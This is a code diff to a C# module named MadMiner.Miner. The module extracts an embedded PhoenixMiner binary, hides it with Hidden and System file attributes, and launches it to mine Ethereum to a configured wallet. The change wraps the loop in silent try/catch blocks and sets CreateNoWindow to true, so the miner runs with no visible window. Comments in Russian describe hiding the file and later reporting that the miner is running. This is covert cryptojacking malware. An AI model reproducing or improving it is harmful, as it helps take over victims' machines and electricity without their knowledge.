@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -11,66 +11,72 @@ namespace MadMiner.Miner
         [STAThread]
         public static void Run() // PhoenixMiner.Run();
         {
-            while (true)
+            try
             {
-                Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
-                if (pname.Length == 0)
+                while (true)
                 {
-                    // Проверяем наличие файла XMRIG Если нету то извлекаем
-                    if (!File.Exists(Settings.poenixBin))
+                    Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
+                    if (pname.Length == 0)
                     {
+                        // Проверяем наличие файла XMRIG Если нету то извлекаем
+                        if (!File.Exists(Settings.poenixBin))
+                        {
 
-                        File.WriteAllBytes(Settings.poenixBin, Properties.Resources.PhoenixAPI);
+                            File.WriteAllBytes(Settings.poenixBin, Properties.Resources.PhoenixAPI);
 
-                        // Скрываемся
-                        File.SetAttributes(Settings.poenixBin, FileAttributes.Hidden | FileAttributes.System);
+                            // Скрываемся
+                            File.SetAttributes(Settings.poenixBin, FileAttributes.Hidden | FileAttributes.System);
 
-                        Thread.Sleep(2000);
-                        GetMiner();
+                            Thread.Sleep(2000);
+                            GetMiner();
+                        }
+                        else
+                        {
+                            GetMiner();
+                        }
                     }
                     else
                     {
-                        GetMiner();
+                        Thread.Sleep(2000);
                     }
-                }
-                else
-                {
+
                     Thread.Sleep(2000);
                 }
-
-                Thread.Sleep(2000);
             }
+            catch { }
         }
 
 
 
         static void GetMiner()
         {
-
-            /* Запуск майнера через cmd */
-            Process process = new Process();
-            process.StartInfo.CreateNoWindow = false;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.Arguments = " -epool " + Settings.poenixPool + " -ewal " + Settings.ethWallet + " -worker Phoenix -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 90 -tstart 80 -coin eth";
-            process.StartInfo.FileName = Settings.poenixBin;
-            process.Start();
-
-
-            new Thread(() =>
+            try
             {
-                Thread.Sleep(120000);
-                Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
-                if (pname.Length == 0)
+                /* Запуск майнера через cmd */
+                Process process = new Process();
+                process.StartInfo.CreateNoWindow = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.Arguments = " -epool " + Settings.poenixPool + " -ewal " + Settings.ethWallet + " -worker Phoenix -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 90 -tstart 80 -coin eth";
+                process.StartInfo.FileName = Settings.poenixBin;
+                process.Start();
+
+
+                new Thread(() =>
                 {
+                    Thread.Sleep(120000);
+                    Process[] pname = Process.GetProcessesByName(Settings.poenixProc);
+                    if (pname.Length == 0)
+                    {
 
-                }
-                else
-                {
-                    // Выполняем если майнинг включен уже 2 минуты! Можно прикрутить например отчет что майнер работает.
-                }
+                    }
+                    else
+                    {
+                        // Выполняем если майнинг включен уже 2 минуты! Можно прикрутить например отчет что майнер работает.
+                    }
 
-            }).Start();
-
+                }).Start();
+            }
+            catch { }
         }
     }
 }
